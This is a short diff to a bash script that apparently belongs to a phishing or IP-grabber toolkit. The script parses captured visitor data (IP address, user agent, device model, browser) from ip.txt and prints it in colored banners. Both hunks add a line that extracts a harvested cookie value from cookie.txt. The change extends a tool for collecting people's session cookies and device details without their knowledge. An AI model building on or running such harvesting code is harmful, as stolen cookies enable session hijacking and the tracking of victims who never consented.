@@ -23,6 +23,7 @@ LEV=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ')' -f2 | tr -cd 0.0-9.0)
 device_type=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | cut -d '/' -f2 | cut -d '.' -f4 | tr -d '0-9' | awk '{print $1;}')
 browser=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | awk '{print $1;}')
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+cookie=$(grep -a 'cookie' cookie.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 device_model=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | cut -d ';' -f3)
 printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP :\e[0m\e[1;77m %s\e[0m\n" $ip
@@ -111,6 +112,7 @@ LEV=$(grep -e 'User' ip.txt | cut -d '(' -f2 | cut -d ')' -f2 | tr -cd 0.0-9.0)
 device_type=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | cut -d '/' -f2 | cut -d '.' -f4 | tr -d '0-9' | awk '{print $1;}')
 browser=$(grep -e 'User' ip.txt | cut -d '(' -f3 | cut -d ')' -f2 | awk '{print $1;}')
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
+cookie=$(grep -a 'cookie' cookie.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 device_model=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | cut -d ';' -f3)
 printf "\e[1;93m[\e[0m\e[1;77m^^\e[0m\e[1;93m] IP :\e[0m\e[1;77m %s\e[0m\n" $ip
